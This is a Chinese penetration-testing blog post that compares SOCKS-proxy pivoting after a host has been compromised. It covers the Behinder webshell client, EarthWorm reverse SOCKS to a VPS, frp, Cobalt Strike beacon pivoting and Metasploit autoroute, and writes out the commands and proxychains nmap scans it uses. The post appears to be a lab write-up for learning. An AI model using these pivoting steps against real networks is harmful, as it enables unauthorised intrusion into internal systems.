---
title: 几种socks代理测试
date: 2020-05-19 21:02:50
categories: 内网渗透
tags: 代理
---

#### socks代理在内网渗透中的作用

当我们拿下了一个目标A，目标的网络环境可能存在两情况

1. 目标A处于公网，但有其它设备B与A相连接，我们可以访问A，无法访问B,但A可以访问B。
2. 目标A处于内网，通过NAT或端口映射将80或者443端口转发到公网上，同样A在内网与其他机器相连并可以相互访问

<!--more-->

此时，我们便可通过socks代理将我们的流量通过被控制的A设备代理到内网来访问内网的资源，如3389，或内网的web服务，省去了端口转发的麻烦。socks代理目前有socks 4 和socks 5两种类型，socks 4只支持TCP协议，而socks 5支持TCP/UDP协议，还支持各种身份验证机制等协议。但貌似不支持ICMP协议，所以使用代理加Nmap的时候就得注意了。

#### 环境

攻击机与靶机在两个完全不同的内网环境，为了模拟服务器处在内网的环境，将靶机的80端口转发到了公网的80端口上，通过配置的域名可以顺利访问到内网靶机的80端口。

![](http://cdn.laohuan.art/Snipaste_2020-05-13_19-45-49.png)

#### 冰蝎

1. 使用冰蝎连接上一句话木马

   ![](http://cdn.laohuan.art/Snipaste_2020-05-13_19-48-52.png)

2. 打开冰蝎的socks代理，监听10086端口

![](http://cdn.laohuan.art/Snipaste_2020-05-13_19-49-14.png)

3. 配置proxifier,设置socks5为127.0.0.1,监听端口和冰蝎保持一致为10086，代理规则里将浏览器加入

   ![](http://cdn.laohuan.art/Snipaste_2020-05-13_19-53-41.png)

此时便可通过火狐浏览器访问内网的web服务，但作者实际测试中并不能顺利访问到内网的web服务，经作对比发现jsp环境可用socks代理访问内网环境，而php环境则不能。

#### EW

使用EW需要有一个公网IP

1. 首先在公网vps上执行如下命令

   `sudo ./ew_for_linux64 -s rcsocks -l 3950 -e 3951`

   ![](http://cdn.laohuan.art/Snipaste_2020-05-13_20-13-39.png)

此命令将3950端口收到的请求转发到3951端口

2. 在肉机上执行

   `./ew_for_linux64 -s rssocks -d x.x.x.x(公网vps) -e 3951`

   ![](http://cdn.laohuan.art/2020-05-13_20-21.png)

3. 编辑proxychains文件

   `nano /etc/proxychains.conf`

   在最后面加上我们的socks代理

   `socks5 x.x.x.x(公网vps) 3950`

4. 访问内网

   `proxychains curl 192.168.88.1`

   192.168.88.1为内网的路由器管理地址

   ![](http://cdn.laohuan.art/2020-05-18_21-31.png)

#### Frp

1. 在公网vps编辑服务端frps.ini文件

   ![](http://cdn.laohuan.art/Snipaste_2020-05-20_21-29-43.png)

   * bind_port 为监听端口
   * token可设可不设，若设置则服务端的token和客户端的token必须保持一致

2. 编辑客户端(靶机)frpc.ini

   ![](http://cdn.laohuan.art/Snipaste_2020-05-16_15-18-00.png)

* server_addr为公网vps的ip
* server_port: 公网vps的监听端口
* remote_port :待会设置代理的时候就需要设置成这个端口

3. 启动frp

   服务端：

   `sudo ./frps -c frps.ini`

   客户端（靶机）:

   `frpc.exe -c frpc.ini`

4. 设置代理

   攻击机配置proxychains.conf文件，socks代理的ip为公网vps的ip，端口为remoet_port所设置的端口

5. 使用代理扫描内网

   `proxychains3 nmap -sT -Pn -n -p80,22,23,443,445` 192.168.88.1

    ![](http://cdn.laohuan.art/2020-05-16_15-16.png)

此处使用nmap要注意-sT 和-Pn参数，不然无法扫描，其次也建议扫描常用端口，不推荐全端口扫描，否则速度过慢。

#### cobaltstrike

1. 通过 **[beacon]** → **Pivoting** → **SOCKS Server** 来在你的团队服务器上设置一个 SOCKS4a 代理服务器。或者使用 socks 8080 命令来在端口 8080 上设置一个 SOCKS4a 代理服务器（或者任何其他你想选择的端口）

![](http://cdn.laohuan.art/2020-05-16_16-44.png)

2. 配置proxychains.conf文件即可通过socks代理访问内网，同样可以复制以上配置到msf中，利用msf畅游内网。

   ```
   setg Proxies socks4:team server IP:proxy port
   setg ReverseAllowProxy true
   ```

   使用proxychains打开浏览器访问内网

   `proxychains firefox`

   ![](http://cdn.laohuan.art/Snipaste_2020-05-13_20-24-16.png)

   

   #### metasploit

   当我们得到一个meterpreter时，可通过添加路由，再添加socks代理，将流量通过socks代理进目标内网，笔者之前直接添加socks代理并无法访问内网，也困扰了一段时间，之后才发现添加路由后才能正常使用。当然要说一点，msf添加路由之后就能扫描内网了。

   1. 添加路由

      查看目标网段

      `run get local subnets`

      添加路由

      `run autoroute -s 192.168.88.0/24`

      查看添加的路由

      `run autoroute -p`

      ![](http://cdn.laohuan.art/Snipaste_2020-05-18_21-14-07.png)

   2. 启动socks4

      `use auxiliary/server/socks4a`

      `set srvport 3950`

      ![](http://cdn.laohuan.art/Snipaste_2020-05-18_21-17-57.png)

   3. 配置proxychains.conf

      `socks4 127.0.0.1 3950`

      

#### 总结

socks代理在内网渗透中有很大的作用，由于图片放在第三方云，整理较麻烦，所以我放了较少的图片，而代码部分会尽量打出来。这也算是我对socks代理使用的一次总结，另外，冰蝎socks代理在php环境无法测试成功的原因欢迎小伙伴提出交流。

#### 参考链接

<https://www.anquanke.com/post/id/85494/>

